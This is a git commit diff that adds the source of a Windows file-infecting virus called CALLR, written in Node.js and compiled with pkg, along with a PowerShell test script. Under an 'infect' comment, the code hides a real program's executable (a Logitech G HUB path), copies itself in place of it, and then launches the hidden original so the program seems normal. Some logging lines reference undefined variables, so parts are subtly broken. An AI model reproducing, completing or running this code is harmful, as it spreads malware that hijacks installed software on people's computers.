00c0f2af6b794d32699cfd08d05064ed552fdf2b
quicksilv3r-2678 <81493812+quicksilv3r-2678@users.noreply.github.com>
2021-04-04 23:20:19 -0700

    heheh
    - bu1ld1ng a c0llar Φ

---
+++ TestCALLR.ps1
@@ -0,0 +1,31 @@
+<# 
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+░░ Invoke-Callr / CALLR t3st scr1pt
+░░
+░░ Exαmpl3 usagε                                              
+░░ PS «c0d3 f0ld3r»\CALLR> . .\TestCALLR.ps1
+░░ PS> Invoke-Callr "C:\\Program Files\\iNFekt\\infekt-win64.exe" 0
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+ #>
+ Function Invoke-Callr {
+    Param(
+        [Parameter(Mandatory=$true)]
+        [string]$targetFilePath,
+        [Parameter(Mandatory=$false)]
+        [Int]$generation = 0
+    )    
+
+    $targetFileName = Split-Path $targetFilePath -leaf
+    $targetPath = Split-Path $targetFilePath    
+
+    if ($generation -eq 0) {        
+        #Rename-Item -Path "$targetFilePath.blah" -NewName "$targetFileName"
+        #Copy-Item "$targetFilePath" -Destination "$targetPath\\$targetFileName.bak"
+        pkg index.js -t node12-win-x64 -o CALLR
+        & .\CALLR.exe    
+    } else {        
+        Copy-Item "$targetFilePath" -Destination ".\CALLR-gen1.exe"
+        Rename-Item -Path "$targetFilePath.blah" -NewName "$targetFileName"
+        & .\CALLR-gen1.exe
+    }    
+}
--- index.js
+++ index.js
@@ -13,6 +13,49 @@
  ▒▓           ╚╝ ╚╝ ╚═══╝         ╚═══╝          ╚═══╝ ╚╝ ╚╝                 █▓
  ░▒                                                                          ▒░
  */
-console.log('≡≡CALLR v0.0.1≡≡')
+const fs = require('fs');
+const{ spawn } = require('child_process');
+
+console.log('≡≡CALLR v0.0.9≡≡')
 console.log('feeding time! Ç···■··')
 console.log('muahahaha')
+
+//let $callrExePath = "C:\\Program Files\\iNFekt\\infekt-win64.exe"
+const $callrExePath = process.argv0;
+const $targetFilePath = "C:\\Program Files\\LGHUB\\lghub.exe";
+const $targetFilePathHidden = "C:\\Program Files\\LGHUB\\lghub.exe.blah";
+// infect
+fs.rename($targetFilePath, $targetFilePathHidden, (err) => {
+    if (err) {
+        console.log('ERROR: ' + err);
+    } else {
+        console.log("renamed " + $targetFilePath + " to " + $targetFilePathHidden);
+        console.log(`process.argv0: ${process.argv0}`);
+        console.log(`copying ${callrExePath} to ${targetFilePath}`);
+        fs.copyFile($callrExePath, $targetFilePath, (err) => {
+            if (err) {
+                console.log("Error Found:", err);
+            } else {
+                console.log(`copied ${callrExePath} to ${targetFilePath}`);
+            }            
+        });
+    }
+});
+
+// run host
+const $hostFilePath = "C:\\Program Files\\iNFekt\\infekt-win64.exe.blah";
+const $hostFilePathExe = "C:\\Program Files\\iNFekt\\infekt-win64.host.exe"
+fs.rename($hostFilePath, $hostFilePathExe, function(err) {
+    if ( err ) console.log(`fs.rename(${hostFilePath}, ${hostFilePathExe} ERROR: ${err}`);    
+    console.log(`renamed ${hostFilePath} to ${hostFilePathExe}`);
+    console.log('running ' + $hostFilePathExe);
+
+    const hostProc = spawn($hostFilePathExe);
+    hostProc.on('close', (code) => {
+        console.log(`child process ${hostFilePathExe} exited with code ${code}`);
+        fs.rename($hostFilePathExe, $hostFilePath, function(err) {
+            if ( err ) console.log(`fs.rename(${hostFilePathExe}, ${hostFilePath} ERROR: ${err}`);    
+            console.log(`renamed ${hostFilePathExe} to ${hostFilePath}`);
+        });
+    });
+});
